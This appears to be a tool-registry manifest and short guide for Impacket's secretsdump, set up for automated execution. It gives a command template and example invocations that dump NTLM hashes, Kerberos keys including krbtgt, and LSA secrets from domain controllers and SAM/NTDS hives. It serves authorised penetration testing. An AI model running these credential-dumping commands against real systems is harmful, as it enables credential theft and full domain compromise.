---
id: security-ad-secretsdump
namespace: security:ad:secretsdump
name: secretsdump
description: Impacket secretsdump tool that extracts NTLM hashes, Kerberos keys,
  and credential material from Windows systems via NTDS.dit, SAM, and LSA techniques.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.credential.dump.ntds
  - security.credential.dump.sam
  - security.credential.dump.lsa
  - security.credential.dump.kerberos
  - security.credential.extract.hash
platforms:
  - linux
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
  - impacket
related_tools:
  - impacket
  - mimikatz
  - certipy
phase: exploitation
techniques:
  - credential-access
  - discovery
  - lateral-movement
items:
  - NoCreds
  - Hash
services:
  - Kerberos
  - SMB
  - LDAP
attack_types:
  - Enumeration
  - CredentialAccess
  - LateralMovement
contract:
  inputs:
    - type: network.target.ip
      description: Domain controller or target IP
    - type: credential.username
      description: Domain username
    - type: credential.password
      description: Plaintext password or NTLM hash
    - type: file.ntds
      description: Local NTDS.dit file (for offline mode)
  outputs:
    - type: security.credential.hash.ntlm
      description: Extracted NTLM password hashes
    - type: security.credential.hash.kerberos
      description: Extracted Kerberos keys
    - type: security.credential.plaintext
      description: Plaintext credentials from LSA
  side_effects:
    - network_traffic
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 128
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 128
  network: medium
  disk_io: low
allowed-tools:
  - secretsdump
parameters:
  - name: just-dc
    type: boolean
    required: false
    default_value: false
    description: "Extract only NTDS.dit data (NTLM + Kerberos)"
    aliases:
      - --just-dc
  - name: just-dc-user
    type: string
    required: false
    description: "Extract data for a specific user from NTDS"
    aliases:
      - --just-dc-user
  - name: just-dc-ntlm
    type: boolean
    required: false
    default_value: false
    description: "Extract only NTLM hashes from NTDS"
    aliases:
      - --just-dc-ntlm
  - name: history
    type: boolean
    required: false
    default_value: false
    description: "Include password history"
    aliases:
      - --history
  - name: pwd-last-set
    type: boolean
    required: false
    default_value: false
    description: "Show password last set timestamps"
    aliases:
      - --pwd-last-set
  - name: user-status
    type: boolean
    required: false
    default_value: false
    description: "Show user account status (disabled/locked)"
    aliases:
      - --user-status
  - name: use-vss
    type: boolean
    required: false
    default_value: false
    description: "Use Volume Shadow Copy for NTDS access"
    aliases:
      - --use-vss
  - name: sam
    type: string
    required: false
    description: "Local SAM hive file for offline dump"
    aliases:
      - -sam
      - --sam
  - name: system
    type: string
    required: false
    description: "SYSTEM hive file for boot key"
    aliases:
      - -system
      - --system
  - name: security
    type: string
    required: false
    description: "SECURITY hive file for LSA secrets"
    aliases:
      - -security
      - --security
  - name: ntds
    type: string
    required: false
    description: "NTDS.dit file for offline parsing"
    aliases:
      - -ntds
      - --ntds
  - name: outputfile
    type: string
    required: false
    description: "Write output to file"
    aliases:
      - --outputfile
  - name: dc-ip
    type: string
    required: false
    description: "IP address of domain controller"
    aliases:
      - --dc-ip
  - name: debug
    type: boolean
    required: false
    default_value: false
    description: "Enable debug output"
    aliases:
      - --debug
execution:
  template: "impacket-secretsdump -just-dc {domain}/{user}:{password}@{target}"
  sandbox: execFile
  timeout_seconds: 600
  shell: false
global_vars:
  target: ip
  domain: domain
  user: user
examples:
  - description: "Remote DCSync — dump all domain hashes from DC"
    command: impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "DCSync with NTLM hash authentication"
    command: impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator@10.10.10.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
  - description: "Dump specific user hash"
    command: impacket-secretsdump -just-dc-user krbtgt evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "Offline NTDS.dit parsing with SYSTEM hive"
    command: impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL
  - description: "Local SAM dump with SYSTEM hive"
    command: impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
  - description: "Full NTDS dump with history and timestamps"
    command: impacket-secretsdump -just-dc -history -pwd-last-set -user-status evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "LSA secrets dump from SECURITY hive"
    command: impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL
  - description: "Use VSS to copy NTDS.dit remotely"
    command: impacket-secretsdump -just-dc -use-vss evilcorp.local/administrator:Pass123@10.10.10.1
references:
  - label: "Impacket GitHub"
    url: "https://github.com/fortra/impacket"
---

# secretsdump — Windows Credential Dumper

secretsdump is the credential dumping powerhouse from the Impacket suite, supporting multiple extraction techniques against Windows systems.

## Extraction Methods

| Method | Command | Description |
|--------|---------|-------------|
| **DCSync** | `-just-dc` | Domain replication, no file access needed |
| **SAM** | `-sam SAM.hive -system SYSTEM.hive` | Local account hashes |
| **LSA** | `-security SECURITY.hive -system SYSTEM.hive` | LSA secrets |
| **NTDS** | `-ntds ntds.dit -system SYSTEM.hive` | Offline NTDS parsing |
| **VSS** | `-use-vss` | Volume Shadow Copy for remote NTDS |

## DCSync Requirements

- Domain Admin privileges (or equivalent rights like Replicating Directory Changes)
- Network access to the domain controller (port 445)
- Target domain controller running Windows
